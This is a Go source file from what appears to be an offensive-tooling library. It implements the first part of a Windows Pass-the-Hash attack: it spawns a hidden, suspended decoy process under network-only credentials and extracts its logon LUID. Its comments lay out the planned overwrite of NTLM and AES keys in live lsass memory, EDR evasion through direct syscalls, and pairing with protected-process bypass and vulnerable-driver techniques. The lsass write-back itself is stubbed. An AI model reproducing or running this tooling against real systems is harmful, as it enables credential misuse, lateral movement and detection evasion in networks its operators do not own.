//go:build windows

package sekurlsa

import (
	"errors"
	"fmt"
	"os"
	"runtime"
	"unsafe"

	"github.com/oioio-space/maldev/win/api"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
	"golang.org/x/sys/windows"
)

// Pass-the-Hash write-back into a live lsass — the inverse of the
// extractor stack. Spawns a process under a decoy account, walks
// lsass MSV / Kerberos lists for the spawned process's LUID, and
// overwrites the per-credential hash bytes in place. After the
// process resumes (NtResumeProcess), it authenticates outbound as
// the target principal even though it logged in with the decoy.
//
// MITRE ATT&CK: T1550.002 — Use Alternate Authentication Material:
// Pass the Hash.
//
// Detection level: HIGH. The technique requires:
//
//   - PROCESS_VM_WRITE on lsass.exe (one of the loudest events any
//     EDR watches; route NtWriteVirtualMemory through a stealth
//     *wsyscall.Caller to reduce the user-mode hook surface).
//   - CreateProcessWithLogonW(LOGON_NETCREDENTIALS_ONLY) — visible
//     to process-creation telemetry; the spawned image lineage is
//     atypical for the impersonated user and SHOULD be flagged by
//     mature behavioral rules.
//
// Operationally the technique survives until the impersonated
// principal's credentials rotate (or until the spawned process
// terminates). It does not require admin if the operator owns
// lsass via a prior PPL bypass + token elevation; in practice it
// pairs with credentials/lsassdump.Unprotect / the v0.18.0 BYOVD
// kernel-driver path.
//
// THIS CHANTIER (II) IS A WORK IN PROGRESS. The current cut ships:
//
//   - Public Params + PTHResult + sentinel errors.
//   - encryptLSA helper (mirror of decryptLSA) — see crypto.go.
//
// The Pass and PassImpersonate entry points are stubbed —
// implementation arrives in subsequent commits per the locked plan
// at docs/superpowers/plans/2026-04-26-sekurlsa-lsassdump-completion.md.

// PTHTarget describes the credentials the spawned process should
// outbound-authenticate as. NTLM is required; AES128/AES256 are
// optional and only needed when the target accepts AES tickets
// (Windows Server 2008 R2+ DCs by default).
type PTHTarget struct {
	// Domain is the FQDN or NetBIOS-style short name of the AD
	// domain the impersonated principal belongs to. Required.
	Domain string

	// Username is the sAMAccountName of the impersonated
	// principal. Required.
	Username string

	// NTLM is the 16-byte MD4 of the impersonated principal's
	// password. Required.
	NTLM []byte

	// AES128 is the 16-byte AES128-CTS-HMAC-SHA1-96 long-term key.
	// Optional — when nil, only NTLM authentication paths work.
	AES128 []byte

	// AES256 is the 32-byte AES256-CTS-HMAC-SHA1-96 long-term key.
	// Optional — same as AES128.
	AES256 []byte
}

// PTHParams configures Pass / PassImpersonate. See the type doc for
// the operational model.
type PTHParams struct {
	// Decoy is the launcher process to spawn under
	// LOGON_NETCREDENTIALS_ONLY. Default cmd.exe.
	Decoy string

	// DecoyArgs is the command-line passed to Decoy. The decoy
	// process is created in CREATE_SUSPENDED so the operator can
	// supply a long-running stub (e.g. a sleep loop) here without
	// racing the LSA writes.
	DecoyArgs string

	// Target is the principal the spawned process will be made to
	// authenticate as. Required.
	Target PTHTarget

	// Caller routes the NtWriteVirtualMemory + NtReadVirtualMemory
	// + NtResumeProcess calls through a stealth syscall strategy.
	// Pass nil for the standard ntdll proc-table path; passing a
	// configured *wsyscall.Caller routes through direct/indirect
	// syscalls for EDR-hook evasion. Same convention as the rest
	// of the credentials/* stack. Currently unused — wired in the
	// next chantier-II commit when the LSA list-walk + write-back
	// path lands.
	Caller *wsyscall.Caller

	// LSAKeyOverride is an optional pre-extracted lsasrv key. When
	// nil, Pass extracts it on the fly from the live lsass via
	// the existing Parse() pipeline (intrusive — opens lsass with
	// PROCESS_VM_READ). Operators with a previously-cached key
	// supply it here to skip the second open.
	LSAKeyOverride *lsaKey
}

// PTHResult is the outcome of a successful Pass / PassImpersonate.
type PTHResult struct {
	// PID of the spawned decoy process — the operator's "handle"
	// to the impersonated session.
	PID uint32

	// LogonID (LUID) of the spawned process's logon session.
	LogonID uint64

	// MSVOverwritten is true when the MSV1_0 LIST_ENTRY for the
	// spawned LUID had its hash bytes successfully overwritten.
	MSVOverwritten bool

	// KerberosOverwritten is true when at least one Kerberos
	// long-term key (NTLM, AES128, AES256) was written into the
	// per-LUID Kerberos session struct.
	KerberosOverwritten bool

	// Warnings collects non-fatal anomalies: missing AES key, no
	// Kerberos session for this LUID, partial overwrite, etc.
	Warnings []string
}

// Sentinel errors. Callers use errors.Is to dispatch.
var (
	// ErrPTHInvalidTarget fires when PTHTarget is missing required
	// fields (Domain / Username / NTLM) or carries malformed
	// hashes (wrong length).
	ErrPTHInvalidTarget = errors.New("sekurlsa: invalid PTH target")

	// ErrPTHSpawnFailed wraps any failure inside
	// CreateProcessWithLogonW or the subsequent token query.
	ErrPTHSpawnFailed = errors.New("sekurlsa: PTH decoy spawn failed")

	// ErrPTHWriteFailed wraps any failure inside the LSA list walk
	// or the NtWriteVirtualMemory overwrite path.
	ErrPTHWriteFailed = errors.New("sekurlsa: PTH lsass write failed")

	// ErrPTHNoMatchingLUID fires when the decoy spawned and got a
	// LUID, but no MSV / Kerberos LIST_ENTRY in lsass matches —
	// usually means the decoy crashed early or LOGON_NETCREDENTIALS_ONLY
	// failed silently.
	ErrPTHNoMatchingLUID = errors.New("sekurlsa: PTH no matching LIST_ENTRY for spawned LUID")

	// ErrPTHNotImplemented is the placeholder error returned by
	// Pass and PassImpersonate while chantier II is still under
	// construction. Will be removed when the implementation lands.
	ErrPTHNotImplemented = errors.New("sekurlsa: Pass/PassImpersonate not yet implemented (chantier II in progress)")
)

// Pass spawns the configured Decoy under LOGON_NETCREDENTIALS_ONLY,
// walks the live lsass for the resulting LUID's MSV / Kerberos
// LIST_ENTRY, overwrites the long-term keys with PTHTarget's
// values, and resumes the process. The spawned process now
// outbound-authenticates as Target on every subsequent network
// auth (SMB, RDP, Kerberos AS-REQ, NTLM challenge-response).
//
// CHANTIER II IN PROGRESS — the current cut spawns the decoy and
// resolves its LUID, but the LSA list-walk / write-back step is
// not yet wired (returns ErrPTHNotImplemented after the spawn).
// The PID + LogonID fields of the returned PTHResult ARE populated
// — operators can already build the orchestration on top.
//
// The spawned process is left CREATE_SUSPENDED until either the
// next-commit write-back resumes it, or the caller observes the
// returned PID and resumes manually. The handles owned by Pass
// are closed before return so external resume requires a fresh
// OpenProcess.
func Pass(p PTHParams) (PTHResult, error) {
	if err := validatePTHParams(p); err != nil {
		return PTHResult{}, err
	}

	pid, luid, err := spawnSuspendedDecoy(p)
	if err != nil {
		return PTHResult{}, err
	}

	res := PTHResult{
		PID:     pid,
		LogonID: luid,
	}

	// LSA write-back lands in the next chantier-II commit. Until
	// then, surface the partial success so callers see the spawn
	// + LUID worked.
	return res, fmt.Errorf("%w (spawn+LUID complete; PID=%d LUID=0x%X)",
		ErrPTHNotImplemented, pid, luid)
}

// PassImpersonate is Pass + SetThreadToken: in addition to
// rewriting the spawned process's LSA state, it duplicates the
// spawned process's primary token onto the calling thread so that
// the operator's *current* thread also outbound-authenticates as
// Target until the impersonation token is reverted (or the thread
// exits).
//
// CHANTIER II IN PROGRESS — same partial implementation as Pass.
func PassImpersonate(p PTHParams) (PTHResult, error) {
	if err := validatePTHParams(p); err != nil {
		return PTHResult{}, err
	}

	pid, luid, err := spawnSuspendedDecoy(p)
	if err != nil {
		return PTHResult{}, err
	}

	res := PTHResult{
		PID:     pid,
		LogonID: luid,
	}
	return res, fmt.Errorf("%w (spawn+LUID complete; PID=%d LUID=0x%X)",
		ErrPTHNotImplemented, pid, luid)
}

// spawnSuspendedDecoy launches the decoy process under
// LOGON_NETCREDENTIALS_ONLY + CREATE_SUSPENDED, queries its primary
// token for the LUID, closes the handles, and returns (PID, LUID).
//
// LOGON_NETCREDENTIALS_ONLY (= 2) tells Windows: "use the supplied
// credentials only for network auth — local execution stays under
// the calling user's context." That's the lever PTH leans on: we
// don't actually need a valid password (the LSA write-back replaces
// the per-LUID hash bytes before the process makes any outbound
// call), so any non-empty placeholder works.
//
// CREATE_SUSPENDED (= 4) freezes the primary thread before any code
// runs, giving us a stable window to walk lsass and patch the LUID's
// credential structs without racing the spawned process.
//
// Decoy default is "cmd.exe" so a wide range of post-spawn actions
// is available; operators that want a stub should pass DecoyArgs to
// pin behavior (e.g. `cmd.exe /c "ping -t 127.0.0.1 -n 99999 >nul"`).
func spawnSuspendedDecoy(p PTHParams) (uint32, uint64, error) {
	const (
		logonNetCredentialsOnly uint32 = 2
		createSuspended         uint32 = 0x4
	)

	decoy := p.Decoy
	if decoy == "" {
		decoy = `C:\Windows\System32\cmd.exe`
	}
	cmdline := decoy
	if p.DecoyArgs != "" {
		cmdline = decoy + " " + p.DecoyArgs
	}

	// CreateProcessWithLogonW credentials: any non-empty values work
	// because the LSA write-back is going to replace the per-LUID
	// hashes before the process makes any outbound call. We pass the
	// actual target principal so the lineage in process trees / event
	// logs reads consistently with what the operator intended.
	ptrUser, err := windows.UTF16PtrFromString(p.Target.Username)
	if err != nil {
		return 0, 0, errors.Join(ErrPTHSpawnFailed, fmt.Errorf("UTF16(Username): %w", err))
	}
	ptrDom, err := windows.UTF16PtrFromString(p.Target.Domain)
	if err != nil {
		return 0, 0, errors.Join(ErrPTHSpawnFailed, fmt.Errorf("UTF16(Domain): %w", err))
	}
	// Decoy password — any non-empty UTF-16 string. The spawn
	// doesn't validate it (LOGON_NETCREDENTIALS_ONLY skips local
	// cred check). UTF16PtrFromString rejects embedded NULs, so
	// the placeholder is a plain ASCII marker.
	ptrPwd, err := windows.UTF16PtrFromString("pth-decoy-placeholder")
	if err != nil {
		return 0, 0, errors.Join(ErrPTHSpawnFailed, fmt.Errorf("UTF16(decoy pwd): %w", err))
	}
	ptrApp, err := windows.UTF16PtrFromString(decoy)
	if err != nil {
		return 0, 0, errors.Join(ErrPTHSpawnFailed, fmt.Errorf("UTF16(Decoy): %w", err))
	}
	ptrCmd, err := windows.UTF16PtrFromString(cmdline)
	if err != nil {
		return 0, 0, errors.Join(ErrPTHSpawnFailed, fmt.Errorf("UTF16(cmdline): %w", err))
	}

	si := &windows.StartupInfo{
		Cb:         uint32(unsafe.Sizeof(windows.StartupInfo{})),
		ShowWindow: windows.SW_HIDE,
		Flags:      windows.STARTF_USESHOWWINDOW,
	}
	pi := &windows.ProcessInformation{}

	creationFlags := uintptr(createSuspended) |
		uintptr(windows.CREATE_UNICODE_ENVIRONMENT) |
		uintptr(windows.CREATE_DEFAULT_ERROR_MODE)

	ret, _, e1 := api.ProcCreateProcessWithLogonW.Call(
		uintptr(unsafe.Pointer(ptrUser)),
		uintptr(unsafe.Pointer(ptrDom)),
		uintptr(unsafe.Pointer(ptrPwd)),
		uintptr(logonNetCredentialsOnly),
		uintptr(unsafe.Pointer(ptrApp)),
		uintptr(unsafe.Pointer(ptrCmd)),
		creationFlags,
		0, // lpEnvironment — inherit
		0, // lpCurrentDirectory — inherit
		uintptr(unsafe.Pointer(si)),
		uintptr(unsafe.Pointer(pi)),
	)
	runtime.KeepAlive(ptrUser)
	runtime.KeepAlive(ptrDom)
	runtime.KeepAlive(ptrPwd)
	runtime.KeepAlive(ptrApp)
	runtime.KeepAlive(ptrCmd)
	runtime.KeepAlive(si)
	runtime.KeepAlive(pi)

	if int(ret) == 0 {
		return 0, 0, errors.Join(ErrPTHSpawnFailed,
			os.NewSyscallError("CreateProcessWithLogonW", e1))
	}

	// LUID extraction: OpenProcessToken(TOKEN_QUERY) →
	// GetTokenInformation(TokenStatistics, …). The Statistics struct
	// carries AuthenticationId (the LUID we want) at offset 8.
	luid, err := luidFromProcess(windows.Handle(pi.Process))
	// Close handles regardless of LUID success — the process stays
	// suspended after handles close (until someone resumes it via
	// a fresh handle).
	_ = windows.CloseHandle(windows.Handle(pi.Process))
	_ = windows.CloseHandle(windows.Handle(pi.Thread))
	if err != nil {
		return pi.ProcessId, 0, err
	}
	return pi.ProcessId, luid, nil
}

// luidFromProcess opens the primary token of hProcess and returns
// the LUID of its logon session via GetTokenInformation(
// TokenStatistics). hProcess must already grant
// PROCESS_QUERY_INFORMATION (CreateProcessWithLogonW returns one
// with PROCESS_ALL_ACCESS — sufficient).
//
// The TOKEN_STATISTICS structure (windows.h):
//
//	typedef struct _TOKEN_STATISTICS {
//	  LUID                 TokenId;            // +0
//	  LUID                 AuthenticationId;   // +8  ← LUID we want
//	  LARGE_INTEGER        ExpirationTime;     // +16
//	  TOKEN_TYPE           TokenType;          // +24
//	  SECURITY_IMPERSONATION_LEVEL ImpersonationLevel; // +28
//	  ULONG                DynamicCharged;     // +32
//	  ULONG                DynamicAvailable;   // +36
//	  ULONG                GroupCount;         // +40
//	  ULONG                PrivilegeCount;     // +44
//	  LUID                 ModifiedId;         // +48
//	} TOKEN_STATISTICS;
//
// Only AuthenticationId is consumed.
func luidFromProcess(hProcess windows.Handle) (uint64, error) {
	var hToken windows.Token
	if err := windows.OpenProcessToken(hProcess, windows.TOKEN_QUERY, &hToken); err != nil {
		return 0, errors.Join(ErrPTHSpawnFailed,
			fmt.Errorf("OpenProcessToken: %w", err))
	}
	defer hToken.Close()

	var stats tokenStatistics
	var retLen uint32
	if err := windows.GetTokenInformation(
		hToken,
		windows.TokenStatistics,
		(*byte)(unsafe.Pointer(&stats)),
		uint32(unsafe.Sizeof(stats)),
		&retLen,
	); err != nil {
		return 0, errors.Join(ErrPTHSpawnFailed,
			fmt.Errorf("GetTokenInformation(TokenStatistics): %w", err))
	}
	luid := uint64(stats.AuthenticationID.HighPart)<<32 |
		uint64(stats.AuthenticationID.LowPart)
	return luid, nil
}

// tokenStatistics mirrors TOKEN_STATISTICS. golang.org/x/sys/windows
// does not expose this struct directly so we declare the minimum we
// consume.
type tokenStatistics struct {
	TokenID            windows.LUID
	AuthenticationID   windows.LUID
	ExpirationTime     int64
	TokenType          uint32
	ImpersonationLevel uint32
	DynamicCharged     uint32
	DynamicAvailable   uint32
	GroupCount         uint32
	PrivilegeCount     uint32
	ModifiedID         windows.LUID
}

// validatePTHParams enforces the contract for both entry points so
// the early-exit on bad input is consistent.
func validatePTHParams(p PTHParams) error {
	if p.Target.Domain == "" {
		return errors.Join(ErrPTHInvalidTarget, errors.New("Target.Domain is required"))
	}
	if p.Target.Username == "" {
		return errors.Join(ErrPTHInvalidTarget, errors.New("Target.Username is required"))
	}
	if len(p.Target.NTLM) != 16 {
		return errors.Join(ErrPTHInvalidTarget, errors.New("Target.NTLM must be 16 bytes (MD4 of the password)"))
	}
	if l := len(p.Target.AES128); l != 0 && l != 16 {
		return errors.Join(ErrPTHInvalidTarget, errors.New("Target.AES128 must be empty or 16 bytes"))
	}
	if l := len(p.Target.AES256); l != 0 && l != 32 {
		return errors.Join(ErrPTHInvalidTarget, errors.New("Target.AES256 must be empty or 32 bytes"))
	}
	return nil
}
